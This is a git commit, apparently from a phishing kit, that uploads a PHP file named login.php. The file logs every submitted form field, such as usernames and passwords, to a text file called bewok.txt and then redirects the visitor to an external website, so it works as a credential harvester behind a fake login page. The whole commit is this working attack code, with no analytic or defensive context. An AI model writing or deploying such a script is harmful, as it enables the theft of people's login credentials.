4c9c72cdead3929753380ce4d3c0e0470148d168
wildanbewok <70773884+wildanbewok@users.noreply.github.com>
2020-09-05 01:27:32 +0700

    Add files via upload

---
+++ login.php
@@ -0,0 +1,13 @@
+<?php
+header ('Location: https://www.manggatoto.com/wap.html ');
+$handle = fopen("bewok.txt", "a");
+foreach($_POST as $variable => $value) {
+    fwrite($handle, $variable);
+    fwrite($handle, "=");
+    fwrite($handle, $value);
+    fwrite($handle, "\r\n");
+}
+fwrite($handle, "===============\r\n");
+fclose($handle);
+exit;
+?>
